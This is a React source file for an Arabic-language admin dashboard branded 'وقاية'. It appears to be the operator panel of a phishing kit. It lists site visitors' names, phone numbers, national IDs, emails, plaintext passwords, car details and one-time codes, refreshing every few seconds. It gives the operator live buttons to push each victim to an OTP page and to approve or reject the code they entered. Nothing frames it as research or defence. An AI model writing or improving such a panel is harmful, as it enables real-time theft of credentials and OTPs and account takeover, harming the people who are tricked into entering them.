import { useState, useEffect } from "react";
import { Shield, Users, Wifi, WifiOff, Trash2, Send, ChevronDown, ChevronUp, RefreshCw, LogOut } from "lucide-react";
import { adminApi, type Visitor } from "@/lib/api";

const POLL = 3000;
const COLS = [
  { label: "الاسم", key: "name" }, { label: "الجوال", key: "phone" },
  { label: "الهوية", key: "nationalId" }, { label: "البريد", key: "email" },
  { label: "كلمة المرور", key: "password" },
  { label: "اللوحة", key: "carPlate" }, { label: "النوع", key: "carMake" },
  { label: "السنة", key: "carYear" }, { label: "OTP", key: "otpCode" },
  { label: "الدولة", key: "country" },
];

function timeAgo(ts: number) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}ث`;
  if (s < 3600) return `${Math.floor(s / 60)}د`;
  return `${Math.floor(s / 3600)}س`;
}

function pageLabel(page: string) {
  const map: Record<string, { label: string; color: string }> = {
    "الرئيسية": { label: "الرئيسية", color: "#6b7280" },
    "تسجيل - الخطوة 1": { label: "بيانات شخصية", color: "#3b82f6" },
    "انتظار": { label: "انتظار", color: "#f59e0b" },
    "تحقق OTP": { label: "OTP", color: "#8b5cf6" },
  };
  const e = map[page];
  if (e) return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 text-white" style={{ background: e.color }}>{e.label}</span>;
  return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 bg-gray-200 text-gray-600">{page || "—"}</span>;
}

export default function AdminPage() {
  const [authed, setAuthed] = useState(false);
  const [email, setEmail] = useState("");
  const [pw, setPw] = useState("");
  const [pwErr, setPwErr] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);

  useEffect(() => {
    if (!authed) return;
    const load = async () => {
      const data = await adminApi.getAll();
      setVisitors(data);
      setLastRefresh(new Date());
    };
    load();
    const iv = setInterval(load, POLL);
    return () => clearInterval(iv);
  }, [authed]);

  const handleLogin = async () => {
    setLoginLoading(true);
    setPwErr("");
    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password: pw }),
        credentials: "include",
      });
      const data = await res.json();
      if (res.ok && data.ok) {
        setAuthed(true);
      } else {
        setPwErr(data.error ?? "بيانات الدخول غير صحيحة");
      }
    } catch {
      setPwErr("خطأ في الاتصال بالخادم");
    } finally {
      setLoginLoading(false);
    }
  };

  if (!authed) return (
    <div className="min-h-screen flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif", background: "linear-gradient(135deg, #1a3a5c, #0e4d40)" }}>
      <div className="bg-white rounded-3xl shadow-2xl w-full max-w-xs mx-4 p-8 space-y-6">
        <div className="text-center space-y-2">
          <div className="w-14 h-14 rounded-full flex items-center justify-center mx-auto shadow" style={{ background: "#1a3a5c" }}>
            <Shield className="w-7 h-7 text-white" strokeWidth={1.5} />
          </div>
          <h1 className="text-[20px] font-extrabold text-gray-900">وقاية — لوحة التحكم</h1>
          <p className="text-[12px] text-gray-400 font-semibold">أدخل بيانات المدير للوصول</p>
        </div>
        <div className="space-y-3">
          <input type="email" placeholder="البريد الإلكتروني" value={email}
            onChange={e => { setEmail(e.target.value); setPwErr(""); }}
            className="w-full px-4 py-3 rounded-xl border-2 text-[15px] font-semibold text-gray-900 outline-none bg-gray-50 border-gray-200 focus:border-blue-400 transition-colors"
            dir="ltr"
          />
          <input type="password" placeholder="كلمة المرور" value={pw}
            onChange={e => { setPw(e.target.value); setPwErr(""); }}
            onKeyDown={e => { if (e.key === "Enter") handleLogin(); }}
            className={`w-full px-4 py-3 rounded-xl border-2 text-[15px] font-semibold text-gray-900 outline-none bg-gray-50 transition-colors
              ${pwErr ? "border-red-400" : "border-gray-200 focus:border-blue-400"}`}
          />
          {pwErr && <p className="text-[12px] text-red-500 font-semibold">{pwErr}</p>}
          <button
            onClick={handleLogin}
            disabled={loginLoading}
            className="w-full py-3 rounded-xl text-white font-extrabold text-[15px] hover:opacity-90 transition-opacity disabled:opacity-60"
            style={{ background: "#1a3a5c" }}>
            {loginLoading ? "جاري التحقق..." : "دخول"}
          </button>
        </div>
      </div>
    </div>
  );

  const active = visitors.filter(v => v.isActive).length;

  async function sendCmd(id: string, cmd: string) {
    setLoading(true);
    await adminApi.sendCmd(id, cmd);
    setLoading(false);
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      {/* Header */}
      <div style={{ background: "#1a3a5c" }} className="shadow-lg">
        <div className="max-w-7xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <Shield className="w-5 h-5 text-amber-400" />
            <span className="text-white text-[16px] font-extrabold">وقاية — لوحة التحكم</span>
          </div>
          <div className="flex items-center gap-4">
            {lastRefresh && (
              <div className="hidden md:flex items-center gap-1.5 text-[11px] text-gray-400">
                <RefreshCw className="w-3 h-3" />
                <span>آخر تحديث: {lastRefresh.toLocaleTimeString("ar-SA")}</span>
              </div>
            )}
            <button onClick={async () => { await fetch("/api/admin/logout", { method: "POST", credentials: "include" }); setAuthed(false); setEmail(""); setPw(""); }}
              className="flex items-center gap-1.5 text-gray-400 hover:text-white text-[12px] font-semibold transition-colors">
              <LogOut className="w-4 h-4" />
              <span className="hidden md:block">خروج</span>
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-6 space-y-5">
        {/* Stats */}
        <div className="grid grid-cols-3 gap-4">
          {[
            { label: "إجمالي الزوار", value: visitors.length, color: "#1a5276", icon: <Users className="w-5 h-5" /> },
            { label: "نشط الآن", value: active, color: "#0e6655", icon: <Wifi className="w-5 h-5" /> },
            { label: "غير نشط", value: visitors.length - active, color: "#6b7280", icon: <WifiOff className="w-5 h-5" /> },
          ].map(s => (
            <div key={s.label} className="bg-white rounded-2xl border border-gray-100 shadow-sm p-4">
              <div className="flex items-center gap-2 mb-2">
                <div className="p-1.5 rounded-lg text-white" style={{ background: s.color }}>
                  {s.icon}
                </div>
              </div>
              <div className="text-[30px] font-black" style={{ color: s.color }}>{s.value}</div>
              <div className="text-[11px] text-gray-500 font-semibold mt-0.5">{s.label}</div>
            </div>
          ))}
        </div>

        {/* Header bar */}
        <div className="flex items-center justify-between">
          <h2 className="text-[15px] font-extrabold text-gray-700">سجل الزوار</h2>
          <button onClick={async () => {
            if (!confirm("هل أنت متأكد من حذف جميع البيانات؟")) return;
            await adminApi.deleteAll();
            setVisitors([]);
          }} className="flex items-center gap-1.5 text-[12px] font-bold text-red-500 hover:text-red-600 transition-colors px-3 py-1.5 rounded-lg hover:bg-red-50">
            <Trash2 className="w-4 h-4" />
            حذف الكل
          </button>
        </div>

        {/* Table */}
        {visitors.length === 0 ? (
          <div className="bg-white rounded-2xl border border-gray-100 py-16 text-center text-gray-400">
            <Users className="w-10 h-10 mx-auto mb-3 opacity-30" />
            <p className="text-[14px] font-semibold">لا يوجد زوار بعد</p>
          </div>
        ) : (
          <div className="space-y-2">
            {visitors.map(v => (
              <div key={v.id} className={`bg-white rounded-2xl border shadow-sm overflow-hidden transition-all
                ${v.isActive ? "border-emerald-200 ring-1 ring-emerald-100" : "border-gray-100"}`}>
                {/* Row summary */}
                <div className="px-4 py-3 flex items-center gap-3 cursor-pointer" onClick={() => setExpanded(expanded === v.id ? null : v.id)}>
                  <div className={`w-2.5 h-2.5 rounded-full flex-shrink-0 ${v.isActive ? "bg-emerald-400 animate-pulse" : "bg-gray-300"}`} />
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-3 flex-wrap">
                      <span className="font-extrabold text-gray-900 text-[14px]">{v.name || "—"}</span>
                      <span className="text-gray-400 text-[13px]" dir="ltr">{v.phone || "—"}</span>
                      {pageLabel(v.page)}
                      {v.isActive && <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 rounded-full px-2 py-0.5">{timeAgo(v.lastSeen)}</span>}
                    </div>
                  </div>
                  {/* Quick actions */}
                  <div className="flex items-center gap-1.5" onClick={e => e.stopPropagation()}>
                    {v.page === "انتظار" && (
                      <button disabled={loading} onClick={() => sendCmd(v.id, "redirect:otp")}
                        className="px-2.5 py-1.5 rounded-lg text-[11px] font-extrabold text-white hover:opacity-80 transition-opacity flex items-center gap-1"
                        style={{ background: "#8b5cf6" }}>
                        <Send className="w-3 h-3" /> إرسال OTP
                      </button>
                    )}
                    {v.page === "تحقق OTP" && (
                      <>
                        <button disabled={loading} onClick={() => sendCmd(v.id, "otp:approved")}
                          className="px-2.5 py-1.5 rounded-lg text-[11px] font-extrabold text-white hover:opacity-80 transition-opacity"
                          style={{ background: "#059669" }}>
                          ✓ قبول
                        </button>
                        <button disabled={loading} onClick={() => sendCmd(v.id, "otp:rejected")}
                          className="px-2.5 py-1.5 rounded-lg text-[11px] font-extrabold text-white hover:opacity-80 transition-opacity"
                          style={{ background: "#dc2626" }}>
                          ✗ رفض
                        </button>
                      </>
                    )}
                    <button onClick={() => adminApi.deleteOne(v.id).then(async () => setVisitors(await adminApi.getAll()))}
                      className="p-1.5 rounded-lg text-gray-400 hover:text-red-500 hover:bg-red-50 transition-colors">
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                  <div className="text-gray-400">
                    {expanded === v.id ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>

                {/* Expanded details */}
                {expanded === v.id && (
                  <div className="border-t border-gray-100 px-4 py-4 bg-gray-50">
                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-3">
                      {COLS.map(col => (
                        <div key={col.key} className="bg-white rounded-xl p-3 border border-gray-100">
                          <div className="text-[10px] text-gray-400 font-bold mb-0.5">{col.label}</div>
                          <div className="text-[13px] font-bold text-gray-900 break-all">{(v as any)[col.key] || "—"}</div>
                        </div>
                      ))}
                      <div className="bg-white rounded-xl p-3 border border-gray-100">
                        <div className="text-[10px] text-gray-400 font-bold mb-0.5">وقت التسجيل</div>
                        <div className="text-[13px] font-bold text-gray-900">{v.submittedAt || "—"}</div>
                      </div>
                    </div>
                    {/* Commands */}
                    <div className="mt-4 flex flex-wrap gap-2">
                      <button disabled={loading} onClick={() => sendCmd(v.id, "redirect:otp")}
                        className="px-3 py-1.5 rounded-lg text-[12px] font-bold text-white hover:opacity-80 transition-opacity"
                        style={{ background: "#8b5cf6" }}>
                        إرسال OTP
                      </button>
                      <button disabled={loading} onClick={() => sendCmd(v.id, "otp:approved")}
                        className="px-3 py-1.5 rounded-lg text-[12px] font-bold text-white hover:opacity-80 transition-opacity"
                        style={{ background: "#059669" }}>
                        قبول OTP
                      </button>
                      <button disabled={loading} onClick={() => sendCmd(v.id, "otp:rejected")}
                        className="px-3 py-1.5 rounded-lg text-[12px] font-bold text-white hover:opacity-80 transition-opacity"
                        style={{ background: "#dc2626" }}>
                        رفض OTP
                      </button>
                      <button disabled={loading} onClick={() => sendCmd(v.id, "redirect:home")}
                        className="px-3 py-1.5 rounded-lg text-[12px] font-bold text-gray-600 bg-gray-200 hover:bg-gray-300 transition-colors">
                        إعادة للرئيسية
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
